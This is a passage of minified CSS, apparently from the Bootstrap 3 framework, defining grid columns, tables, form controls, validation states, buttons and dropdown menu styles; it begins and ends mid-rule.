.col-md-12{float:left}.col-md-12{width:100%}.col-md-11{width:91.66666667%}.col-md-10{width:83.33333333%}.col-md-9{width:75%}.col-md-8{width:66.66666667%}.col-md-7{width:58.33333333%}.col-md-6{width:50%}.col-md-5{width:41.66666667%}.col-md-4{width:33.33333333%}.col-md-3{width:25%}.col-md-2{width:16.66666667%}.col-md-1{width:8.33333333%}.col-md-pull-12{right:100%}.col-md-pull-11{right:91.66666667%}.col-md-pull-10{right:83.33333333%}.col-md-pull-9{right:75%}.col-md-pull-8{right:66.66666667%}.col-md-pull-7{right:58.33333333%}.col-md-pull-6{right:50%}.col-md-pull-5{right:41.66666667%}.col-md-pull-4{right:33.33333333%}.col-md-pull-3{right:25%}.col-md-pull-2{right:16.66666667%}.col-md-pull-1{right:8.33333333%}.col-md-pull-0{right:auto}.col-md-push-12{left:100%}.col-md-push-11{left:91.66666667%}.col-md-push-10{left:83.33333333%}.col-md-push-9{left:75%}.col-md-push-8{left:66.66666667%}.col-md-push-7{left:58.33333333%}.col-md-push-6{left:50%}.col-md-push-5{left:41.66666667%}.col-md-push-4{left:33.33333333%}.col-md-push-3{left:25%}.col-md-push-2{left:16.66666667%}.col-md-push-1{left:8.33333333%}.col-md-push-0{left:auto}.col-md-offset-12{margin-left:100%}.col-md-offset-11{margin-left:91.66666667%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-9{margin-left:75%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-6{margin-left:50%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-3{margin-left:25%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-0{margin-left:0}}@media (min-width:1200px){.col-lg-1, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-lg-10, .col-lg-11, .col-lg-12{float:left}.col-lg-12{width:100%}.col-lg-11{width:91.66666667%}.col-lg-10{width:83.33333333%}.col-lg-9{width:75%}.col-lg-8{width:66.66666667%}.col-lg-7{width:58.33333333%}.col-lg-6{width:50%}.col-lg-5{width:41.66666667%}.col-lg-4{width:33.33333333%}.col-lg-3{width:25%}.col-lg-2{width:16.66666667%}.col-lg-1{width:8.33333333%}.col-lg-pull-12{right:100%}.col-lg-pull-11{right:91.66666667%}.col-lg-pull-10{right:83.33333333%}.col-lg-pull-9{right:75%}.col-lg-pull-8{right:66.66666667%}.col-lg-pull-7{right:58.33333333%}.col-lg-pull-6{right:50%}.col-lg-pull-5{right:41.66666667%}.col-lg-pull-4{right:33.33333333%}.col-lg-pull-3{right:25%}.col-lg-pull-2{right:16.66666667%}.col-lg-pull-1{right:8.33333333%}.col-lg-pull-0{right:auto}.col-lg-push-12{left:100%}.col-lg-push-11{left:91.66666667%}.col-lg-push-10{left:83.33333333%}.col-lg-push-9{left:75%}.col-lg-push-8{left:66.66666667%}.col-lg-push-7{left:58.33333333%}.col-lg-push-6{left:50%}.col-lg-push-5{left:41.66666667%}.col-lg-push-4{left:33.33333333%}.col-lg-push-3{left:25%}.col-lg-push-2{left:16.66666667%}.col-lg-push-1{left:8.33333333%}.col-lg-push-0{left:auto}.col-lg-offset-12{margin-left:100%}.col-lg-offset-11{margin-left:91.66666667%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-0{margin-left:0}}table{background-color:transparent}caption{padding-top:8px;padding-bottom:8px;color:#777;text-align:left}th{text-align:left}.table{width:100%;max-width:100%;margin-bottom:20px}.table>thead>tr>th,.table>tbody>tr>th,.table>tfoot>tr>th,.table>thead>tr>td,.table>tbody>tr>td,.table>tfoot>tr>td{padding:8px;line-height:1.42857143;vertical-align:top;border-top:1px solid #ddd}.table>thead>tr>th{vertical-align:bottom;border-bottom:2px solid #ddd}.table>caption+thead>tr:first-child>th,.table>colgroup+thead>tr:first-child>th,.table>thead:first-child>tr:first-child>th,.table>caption+thead>tr:first-child>td,.table>colgroup+thead>tr:first-child>td,.table>thead:first-child>tr:first-child>td{border-top:0}.table>tbody+tbody{border-top:2px solid #ddd}.table .table{background-color:#fff}.table-condensed>thead>tr>th,.table-condensed>tbody>tr>th,.table-condensed>tfoot>tr>th,.table-condensed>thead>tr>td,.table-condensed>tbody>tr>td,.table-condensed>tfoot>tr>td{padding:5px}.table-bordered{border:1px solid #ddd}.table-bordered>thead>tr>th,.table-bordered>tbody>tr>th,.table-bordered>tfoot>tr>th,.table-bordered>thead>tr>td,.table-bordered>tbody>tr>td,.table-bordered>tfoot>tr>td{border:1px solid #ddd}.table-bordered>thead>tr>th,.table-bordered>thead>tr>td{border-bottom-width:2px}.table-striped>tbody>tr:nth-of-type(odd){background-color:#f9f9f9}.table-hover>tbody>tr:hover{background-color:#f5f5f5}table col[class*="col-"]{position:static;float:none;display:table-column}table td[class*="col-"],table th[class*="col-"]{position:static;float:none;display:table-cell}.table>thead>tr>td.active,.table>tbody>tr>td.active,.table>tfoot>tr>td.active,.table>thead>tr>th.active,.table>tbody>tr>th.active,.table>tfoot>tr>th.active,.table>thead>tr.active>td,.table>tbody>tr.active>td,.table>tfoot>tr.active>td,.table>thead>tr.active>th,.table>tbody>tr.active>th,.table>tfoot>tr.active>th{background-color:#f5f5f5}.table-hover>tbody>tr>td.active:hover,.table-hover>tbody>tr>th.active:hover,.table-hover>tbody>tr.active:hover>td,.table-hover>tbody>tr:hover>.active,.table-hover>tbody>tr.active:hover>th{background-color:#e8e8e8}.table>thead>tr>td.success,.table>tbody>tr>td.success,.table>tfoot>tr>td.success,.table>thead>tr>th.success,.table>tbody>tr>th.success,.table>tfoot>tr>th.success,.table>thead>tr.success>td,.table>tbody>tr.success>td,.table>tfoot>tr.success>td,.table>thead>tr.success>th,.table>tbody>tr.success>th,.table>tfoot>tr.success>th{background-color:#dff0d8}.table-hover>tbody>tr>td.success:hover,.table-hover>tbody>tr>th.success:hover,.table-hover>tbody>tr.success:hover>td,.table-hover>tbody>tr:hover>.success,.table-hover>tbody>tr.success:hover>th{background-color:#d0e9c6}.table>thead>tr>td.info,.table>tbody>tr>td.info,.table>tfoot>tr>td.info,.table>thead>tr>th.info,.table>tbody>tr>th.info,.table>tfoot>tr>th.info,.table>thead>tr.info>td,.table>tbody>tr.info>td,.table>tfoot>tr.info>td,.table>thead>tr.info>th,.table>tbody>tr.info>th,.table>tfoot>tr.info>th{background-color:#d9edf7}.table-hover>tbody>tr>td.info:hover,.table-hover>tbody>tr>th.info:hover,.table-hover>tbody>tr.info:hover>td,.table-hover>tbody>tr:hover>.info,.table-hover>tbody>tr.info:hover>th{background-color:#c4e3f3}.table>thead>tr>td.warning,.table>tbody>tr>td.warning,.table>tfoot>tr>td.warning,.table>thead>tr>th.warning,.table>tbody>tr>th.warning,.table>tfoot>tr>th.warning,.table>thead>tr.warning>td,.table>tbody>tr.warning>td,.table>tfoot>tr.warning>td,.table>thead>tr.warning>th,.table>tbody>tr.warning>th,.table>tfoot>tr.warning>th{background-color:#fcf8e3}.table-hover>tbody>tr>td.warning:hover,.table-hover>tbody>tr>th.warning:hover,.table-hover>tbody>tr.warning:hover>td,.table-hover>tbody>tr:hover>.warning,.table-hover>tbody>tr.warning:hover>th{background-color:#faf2cc}.table>thead>tr>td.danger,.table>tbody>tr>td.danger,.table>tfoot>tr>td.danger,.table>thead>tr>th.danger,.table>tbody>tr>th.danger,.table>tfoot>tr>th.danger,.table>thead>tr.danger>td,.table>tbody>tr.danger>td,.table>tfoot>tr.danger>td,.table>thead>tr.danger>th,.table>tbody>tr.danger>th,.table>tfoot>tr.danger>th{background-color:#f2dede}.table-hover>tbody>tr>td.danger:hover,.table-hover>tbody>tr>th.danger:hover,.table-hover>tbody>tr.danger:hover>td,.table-hover>tbody>tr:hover>.danger,.table-hover>tbody>tr.danger:hover>th{background-color:#ebcccc}.table-responsive{overflow-x:auto;min-height:0.01%}@media screen and (max-width:767px){.table-responsive{width:100%;margin-bottom:15px;overflow-y:hidden;-ms-overflow-style:-ms-autohiding-scrollbar;border:1px solid #ddd}.table-responsive>.table{margin-bottom:0}.table-responsive>.table>thead>tr>th,.table-responsive>.table>tbody>tr>th,.table-responsive>.table>tfoot>tr>th,.table-responsive>.table>thead>tr>td,.table-responsive>.table>tbody>tr>td,.table-responsive>.table>tfoot>tr>td{white-space:nowrap}.table-responsive>.table-bordered{border:0}.table-responsive>.table-bordered>thead>tr>th:first-child,.table-responsive>.table-bordered>tbody>tr>th:first-child,.table-responsive>.table-bordered>tfoot>tr>th:first-child,.table-responsive>.table-bordered>thead>tr>td:first-child,.table-responsive>.table-bordered>tbody>tr>td:first-child,.table-responsive>.table-bordered>tfoot>tr>td:first-child{border-left:0}.table-responsive>.table-bordered>thead>tr>th:last-child,.table-responsive>.table-bordered>tbody>tr>th:last-child,.table-responsive>.table-bordered>tfoot>tr>th:last-child,.table-responsive>.table-bordered>thead>tr>td:last-child,.table-responsive>.table-bordered>tbody>tr>td:last-child,.table-responsive>.table-bordered>tfoot>tr>td:last-child{border-right:0}.table-responsive>.table-bordered>tbody>tr:last-child>th,.table-responsive>.table-bordered>tfoot>tr:last-child>th,.table-responsive>.table-bordered>tbody>tr:last-child>td,.table-responsive>.table-bordered>tfoot>tr:last-child>td{border-bottom:0}}fieldset{padding:0;margin:0;border:0;min-width:0}legend{display:block;width:100%;padding:0;margin-bottom:20px;font-size:21px;line-height:inherit;color:#333;border:0;border-bottom:1px solid #e5e5e5}label{display:inline-block;max-width:100%;margin-bottom:5px;font-weight:bold}input[type="search"]{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}input[type="radio"],input[type="checkbox"]{margin:4px 0 0;margin-top:1px \9;line-height:normal}input[type="file"]{display:block}input[type="range"]{display:block;width:100%}select[multiple],select[size]{height:auto}input[type="file"]:focus,input[type="radio"]:focus,input[type="checkbox"]:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}output{display:block;padding-top:7px;font-size:14px;line-height:1.42857143;color:#555}.form-control{display:block;width:100%;height:34px;padding:6px 12px;font-size:14px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075);box-shadow:inset 0 1px 1px rgba(0,0,0,0.075);-webkit-transition:border-color ease-in-out .15s, -webkit-box-shadow ease-in-out .15s;-o-transition:border-color ease-in-out .15s, box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s, box-shadow ease-in-out .15s}.form-control:focus{border-color:#66afe9;outline:0;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102, 175, 233, 0.6);box-shadow:inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102, 175, 233, 0.6)}.form-control::-moz-placeholder{color:#999;opacity:1}.form-control:-ms-input-placeholder{color:#999}.form-control::-webkit-input-placeholder{color:#999}.form-control::-ms-expand{border:0;background-color:transparent}.form-control[disabled],.form-control[readonly],fieldset[disabled] .form-control{background-color:#eee;opacity:1}.form-control[disabled],fieldset[disabled] .form-control{cursor:not-allowed}textarea.form-control{height:auto}input[type="search"]{-webkit-appearance:none}@media screen and (-webkit-min-device-pixel-ratio:0){input[type="date"].form-control,input[type="time"].form-control,input[type="datetime-local"].form-control,input[type="month"].form-control{line-height:34px}input[type="date"].input-sm,input[type="time"].input-sm,input[type="datetime-local"].input-sm,input[type="month"].input-sm,.input-group-sm input[type="date"],.input-group-sm input[type="time"],.input-group-sm input[type="datetime-local"],.input-group-sm input[type="month"]{line-height:30px}input[type="date"].input-lg,input[type="time"].input-lg,input[type="datetime-local"].input-lg,input[type="month"].input-lg,.input-group-lg input[type="date"],.input-group-lg input[type="time"],.input-group-lg input[type="datetime-local"],.input-group-lg input[type="month"]{line-height:46px}}.form-group{margin-bottom:15px}.radio,.checkbox{position:relative;display:block;margin-top:10px;margin-bottom:10px}.radio label,.checkbox label{min-height:20px;padding-left:20px;margin-bottom:0;font-weight:normal;cursor:pointer}.radio input[type="radio"],.radio-inline input[type="radio"],.checkbox input[type="checkbox"],.checkbox-inline input[type="checkbox"]{position:absolute;margin-left:-20px;margin-top:4px \9}.radio+.radio,.checkbox+.checkbox{margin-top:-5px}.radio-inline,.checkbox-inline{position:relative;display:inline-block;padding-left:20px;margin-bottom:0;vertical-align:middle;font-weight:normal;cursor:pointer}.radio-inline+.radio-inline,.checkbox-inline+.checkbox-inline{margin-top:0;margin-left:10px}input[type="radio"][disabled],input[type="checkbox"][disabled],input[type="radio"].disabled,input[type="checkbox"].disabled,fieldset[disabled] input[type="radio"],fieldset[disabled] input[type="checkbox"]{cursor:not-allowed}.radio-inline.disabled,.checkbox-inline.disabled,fieldset[disabled] .radio-inline,fieldset[disabled] .checkbox-inline{cursor:not-allowed}.radio.disabled label,.checkbox.disabled label,fieldset[disabled] .radio label,fieldset[disabled] .checkbox label{cursor:not-allowed}.form-control-static{padding-top:7px;padding-bottom:7px;margin-bottom:0;min-height:34px}.form-control-static.input-lg,.form-control-static.input-sm{padding-left:0;padding-right:0}.input-sm{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}select.input-sm{height:30px;line-height:30px}textarea.input-sm,select[multiple].input-sm{height:auto}.form-group-sm .form-control{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}.form-group-sm select.form-control{height:30px;line-height:30px}.form-group-sm textarea.form-control,.form-group-sm select[multiple].form-control{height:auto}.form-group-sm .form-control-static{height:30px;min-height:32px;padding:6px 10px;font-size:12px;line-height:1.5}.input-lg{height:46px;padding:10px 16px;font-size:18px;line-height:1.3333333;border-radius:6px}select.input-lg{height:46px;line-height:46px}textarea.input-lg,select[multiple].input-lg{height:auto}.form-group-lg .form-control{height:46px;padding:10px 16px;font-size:18px;line-height:1.3333333;border-radius:6px}.form-group-lg select.form-control{height:46px;line-height:46px}.form-group-lg textarea.form-control,.form-group-lg select[multiple].form-control{height:auto}.form-group-lg .form-control-static{height:46px;min-height:38px;padding:11px 16px;font-size:18px;line-height:1.3333333}.has-feedback{position:relative}.has-feedback .form-control{padding-right:42.5px}.form-control-feedback{position:absolute;top:0;right:0;z-index:2;display:block;width:34px;height:34px;line-height:34px;text-align:center;pointer-events:none}.input-lg+.form-control-feedback,.input-group-lg+.form-control-feedback,.form-group-lg .form-control+.form-control-feedback{width:46px;height:46px;line-height:46px}.input-sm+.form-control-feedback,.input-group-sm+.form-control-feedback,.form-group-sm .form-control+.form-control-feedback{width:30px;height:30px;line-height:30px}.has-success .help-block,.has-success .control-label,.has-success .radio,.has-success .checkbox,.has-success .radio-inline,.has-success .checkbox-inline,.has-success.radio label,.has-success.checkbox label,.has-success.radio-inline label,.has-success.checkbox-inline label{color:#3c763d}.has-success .form-control{border-color:#3c763d;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075);box-shadow:inset 0 1px 1px rgba(0,0,0,0.075)}.has-success .form-control:focus{border-color:#2b542c;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 6px #67b168;box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 6px #67b168}.has-success .input-group-addon{color:#3c763d;border-color:#3c763d;background-color:#dff0d8}.has-success .form-control-feedback{color:#3c763d}.has-warning .help-block,.has-warning .control-label,.has-warning .radio,.has-warning .checkbox,.has-warning .radio-inline,.has-warning .checkbox-inline,.has-warning.radio label,.has-warning.checkbox label,.has-warning.radio-inline label,.has-warning.checkbox-inline label{color:#8a6d3b}.has-warning .form-control{border-color:#8a6d3b;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075);box-shadow:inset 0 1px 1px rgba(0,0,0,0.075)}.has-warning .form-control:focus{border-color:#66512c;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 6px #c0a16b;box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 6px #c0a16b}.has-warning .input-group-addon{color:#8a6d3b;border-color:#8a6d3b;background-color:#fcf8e3}.has-warning .form-control-feedback{color:#8a6d3b}.has-error .help-block,.has-error .control-label,.has-error .radio,.has-error .checkbox,.has-error .radio-inline,.has-error .checkbox-inline,.has-error.radio label,.has-error.checkbox label,.has-error.radio-inline label,.has-error.checkbox-inline label{color:#a94442}.has-error .form-control{border-color:#a94442;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075);box-shadow:inset 0 1px 1px rgba(0,0,0,0.075)}.has-error .form-control:focus{border-color:#843534;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 6px #ce8483;box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 6px #ce8483}.has-error .input-group-addon{color:#a94442;border-color:#a94442;background-color:#f2dede}.has-error .form-control-feedback{color:#a94442}.has-feedback label~.form-control-feedback{top:25px}.has-feedback label.sr-only~.form-control-feedback{top:0}.help-block{display:block;margin-top:5px;margin-bottom:10px;color:#737373}@media (min-width:768px){.form-inline .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}.form-inline .form-control{display:inline-block;width:auto;vertical-align:middle}.form-inline .form-control-static{display:inline-block}.form-inline .input-group{display:inline-table;vertical-align:middle}.form-inline .input-group .input-group-addon,.form-inline .input-group .input-group-btn,.form-inline .input-group .form-control{width:auto}.form-inline .input-group>.form-control{width:100%}.form-inline .control-label{margin-bottom:0;vertical-align:middle}.form-inline .radio,.form-inline .checkbox{display:inline-block;margin-top:0;margin-bottom:0;vertical-align:middle}.form-inline .radio label,.form-inline .checkbox label{padding-left:0}.form-inline .radio input[type="radio"],.form-inline .checkbox input[type="checkbox"]{position:relative;margin-left:0}.form-inline .has-feedback .form-control-feedback{top:0}}.form-horizontal .radio,.form-horizontal .checkbox,.form-horizontal .radio-inline,.form-horizontal .checkbox-inline{margin-top:0;margin-bottom:0;padding-top:7px}.form-horizontal .radio,.form-horizontal .checkbox{min-height:27px}.form-horizontal .form-group{margin-left:-15px;margin-right:-15px}@media (min-width:768px){.form-horizontal .control-label{text-align:right;margin-bottom:0;padding-top:7px}}.form-horizontal .has-feedback .form-control-feedback{right:15px}@media (min-width:768px){.form-horizontal .form-group-lg .control-label{padding-top:11px;font-size:18px}}@media (min-width:768px){.form-horizontal .form-group-sm .control-label{padding-top:6px;font-size:12px}}.btn{display:inline-block;margin-bottom:0;font-weight:normal;text-align:center;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:14px;line-height:1.42857143;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.btn:focus,.btn:active:focus,.btn.active:focus,.btn.focus,.btn:active.focus,.btn.active.focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn:hover,.btn:focus,.btn.focus{color:#333;text-decoration:none}.btn:active,.btn.active{outline:0;background-image:none;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}.btn.disabled,.btn[disabled],fieldset[disabled] .btn{cursor:not-allowed;opacity:.65;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none}a.btn.disabled,fieldset[disabled] a.btn{pointer-events:none}.btn-default{color:#333;background-color:#fff;border-color:#ccc}.btn-default:focus,.btn-default.focus{color:#333;background-color:#e6e6e6;border-color:#8c8c8c}.btn-default:hover{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active,.btn-default.active,.open>.dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active:hover,.btn-default.active:hover,.open>.dropdown-toggle.btn-default:hover,.btn-default:active:focus,.btn-default.active:focus,.open>.dropdown-toggle.btn-default:focus,.btn-default:active.focus,.btn-default.active.focus,.open>.dropdown-toggle.btn-default.focus{color:#333;background-color:#d4d4d4;border-color:#8c8c8c}.btn-default:active,.btn-default.active,.open>.dropdown-toggle.btn-default{background-image:none}.btn-default.disabled:hover,.btn-default[disabled]:hover,fieldset[disabled] .btn-default:hover,.btn-default.disabled:focus,.btn-default[disabled]:focus,fieldset[disabled] .btn-default:focus,.btn-default.disabled.focus,.btn-default[disabled].focus,fieldset[disabled] .btn-default.focus{background-color:#fff;border-color:#ccc}.btn-default .badge{color:#fff;background-color:#333}.btn-primary{color:#fff;background-color:#337ab7;border-color:#2e6da4}.btn-primary:focus,.btn-primary.focus{color:#fff;background-color:#286090;border-color:#122b40}.btn-primary:hover{color:#fff;background-color:#286090;border-color:#204d74}.btn-primary:active,.btn-primary.active,.open>.dropdown-toggle.btn-primary{color:#fff;background-color:#286090;border-color:#204d74}.btn-primary:active:hover,.btn-primary.active:hover,.open>.dropdown-toggle.btn-primary:hover,.btn-primary:active:focus,.btn-primary.active:focus,.open>.dropdown-toggle.btn-primary:focus,.btn-primary:active.focus,.btn-primary.active.focus,.open>.dropdown-toggle.btn-primary.focus{color:#fff;background-color:#204d74;border-color:#122b40}.btn-primary:active,.btn-primary.active,.open>.dropdown-toggle.btn-primary{background-image:none}.btn-primary.disabled:hover,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus,fieldset[disabled] .btn-primary:focus,.btn-primary.disabled.focus,.btn-primary[disabled].focus,fieldset[disabled] .btn-primary.focus{background-color:#337ab7;border-color:#2e6da4}.btn-primary .badge{color:#337ab7;background-color:#fff}.btn-success{color:#fff;background-color:#5cb85c;border-color:#4cae4c}.btn-success:focus,.btn-success.focus{color:#fff;background-color:#449d44;border-color:#255625}.btn-success:hover{color:#fff;background-color:#449d44;border-color:#398439}.btn-success:active,.btn-success.active,.open>.dropdown-toggle.btn-success{color:#fff;background-color:#449d44;border-color:#398439}.btn-success:active:hover,.btn-success.active:hover,.open>.dropdown-toggle.btn-success:hover,.btn-success:active:focus,.btn-success.active:focus,.open>.dropdown-toggle.btn-success:focus,.btn-success:active.focus,.btn-success.active.focus,.open>.dropdown-toggle.btn-success.focus{color:#fff;background-color:#398439;border-color:#255625}.btn-success:active,.btn-success.active,.open>.dropdown-toggle.btn-success{background-image:none}.btn-success.disabled:hover,.btn-success[disabled]:hover,fieldset[disabled] .btn-success:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus,fieldset[disabled] .btn-success:focus,.btn-success.disabled.focus,.btn-success[disabled].focus,fieldset[disabled] .btn-success.focus{background-color:#5cb85c;border-color:#4cae4c}.btn-success .badge{color:#5cb85c;background-color:#fff}.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}.btn-info:focus,.btn-info.focus{color:#fff;background-color:#31b0d5;border-color:#1b6d85}.btn-info:hover{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active,.btn-info.active,.open>.dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active:hover,.btn-info.active:hover,.open>.dropdown-toggle.btn-info:hover,.btn-info:active:focus,.btn-info.active:focus,.open>.dropdown-toggle.btn-info:focus,.btn-info:active.focus,.btn-info.active.focus,.open>.dropdown-toggle.btn-info.focus{color:#fff;background-color:#269abc;border-color:#1b6d85}.btn-info:active,.btn-info.active,.open>.dropdown-toggle.btn-info{background-image:none}.btn-info.disabled:hover,.btn-info[disabled]:hover,fieldset[disabled] .btn-info:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus,fieldset[disabled] .btn-info:focus,.btn-info.disabled.focus,.btn-info[disabled].focus,fieldset[disabled] .btn-info.focus{background-color:#5bc0de;border-color:#46b8da}.btn-info .badge{color:#5bc0de;background-color:#fff}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning:focus,.btn-warning.focus{color:#fff;background-color:#ec971f;border-color:#985f0d}.btn-warning:hover{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active,.btn-warning.active,.open>.dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active:hover,.btn-warning.active:hover,.open>.dropdown-toggle.btn-warning:hover,.btn-warning:active:focus,.btn-warning.active:focus,.open>.dropdown-toggle.btn-warning:focus,.btn-warning:active.focus,.btn-warning.active.focus,.open>.dropdown-toggle.btn-warning.focus{color:#fff;background-color:#d58512;border-color:#985f0d}.btn-warning:active,.btn-warning.active,.open>.dropdown-toggle.btn-warning{background-image:none}.btn-warning.disabled:hover,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning:hover,.btn-warning.disabled:focus,.btn-warning[disabled]:focus,fieldset[disabled] .btn-warning:focus,.btn-warning.disabled.focus,.btn-warning[disabled].focus,fieldset[disabled] .btn-warning.focus{background-color:#f0ad4e;border-color:#eea236}.btn-warning .badge{color:#f0ad4e;background-color:#fff}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger:focus,.btn-danger.focus{color:#fff;background-color:#c9302c;border-color:#761c19}.btn-danger:hover{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active,.btn-danger.active,.open>.dropdown-toggle.btn-danger{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active:hover,.btn-danger.active:hover,.open>.dropdown-toggle.btn-danger:hover,.btn-danger:active:focus,.btn-danger.active:focus,.open>.dropdown-toggle.btn-danger:focus,.btn-danger:active.focus,.btn-danger.active.focus,.open>.dropdown-toggle.btn-danger.focus{color:#fff;background-color:#ac2925;border-color:#761c19}.btn-danger:active,.btn-danger.active,.open>.dropdown-toggle.btn-danger{background-image:none}.btn-danger.disabled:hover,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger:hover,.btn-danger.disabled:focus,.btn-danger[disabled]:focus,fieldset[disabled] .btn-danger:focus,.btn-danger.disabled.focus,.btn-danger[disabled].focus,fieldset[disabled] .btn-danger.focus{background-color:#d9534f;border-color:#d43f3a}.btn-danger .badge{color:#d9534f;background-color:#fff}.btn-link{color:#337ab7;font-weight:normal;border-radius:0}.btn-link,.btn-link:active,.btn-link.active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}.btn-link,.btn-link:hover,.btn-link:focus,.btn-link:active{border-color:transparent}.btn-link:hover,.btn-link:focus{color:#23527c;text-decoration:underline;background-color:transparent}.btn-link[disabled]:hover,fieldset[disabled] .btn-link:hover,.btn-link[disabled]:focus,fieldset[disabled] .btn-link:focus{color:#777;text-decoration:none}.btn-lg,.btn-group-lg>.btn{padding:10px 16px;font-size:18px;line-height:1.3333333;border-radius:6px}.btn-sm,.btn-group-sm>.btn{padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}.btn-xs,.btn-group-xs>.btn{padding:1px 5px;font-size:12px;line-height:1.5;border-radius:3px}.btn-block{display:block;width:100%}.btn-block+.btn-block{margin-top:5px}input[type="submit"].btn-block,input[type="reset"].btn-block,input[type="button"].btn-block{width:100%}.fade{opacity:0;-webkit-transition:opacity .15s linear;-o-transition:opacity .15s linear;transition:opacity .15s linear}.fade.in{opacity:1}.collapse{display:none}.collapse.in{display:block}tr.collapse.in{display:table-row}tbody.collapse.in{display:table-row-group}.collapsing{position:relative;height:0;overflow:hidden;-webkit-transition-property:height, visibility;-o-transition-property:height, visibility;transition-property:height, visibility;-webkit-transition-duration:.35s;-o-transition-duration:.35s;transition-duration:.35s;-webkit-transition-timing-function:ease;-o-transition-timing-function:ease;transition-timing-function:ease}.caret{display:inline-block;width:0;height:0;margin-left:2px;vertical-align:middle;border-top:4px dashed;border-top:4px solid \9;border-right:4px solid transparent;border-left:4px solid transparent}.dropup,.dropdown{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;list-style:none;font-size:14px;text-align:left;background-color:#fff;border:1px solid #ccc;border:1px solid rgba(0,0,0,0.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,0.175);box-shadow:0 6px 12px rgba(0,0,0,0.175);-webkit-background-clip:padding-box;background-clip:padding-box}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu>li>a{display:block;padding:3px 20px;clear:both;font-weight:normal;line-height:1.42857143;color:#333;white-space:nowrap}.dropdown-menu>li>a:hover,.dropdown-menu>li>a:focus{text-decoration:none;color:#262626;background-color:#f5f5f5}.dropdown-menu>.active>a,.dropdown-menu>.active>a:hover,.dropdown-menu>.active>a:focus{color:#fff;text-decoration:none;outline:0;background-color:#337ab7}.dropdown-menu>.disabled>a,.dropdown-menu>.disabled>a:hover,.dropdown-menu>.disabled>a:focus{color:#777}.dropdown-menu>.disabled>a:hover,.dropdown-menu>.disabled>a:focus{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);cursor:not-allowed}.open>.dropdown-menu{display:block}.open>a{outline:0}.dropdown-menu-right{left:auto;right:0}.dropdown-menu-left{left:0;right:auto}.dropdown-header{display:block;padding:3px 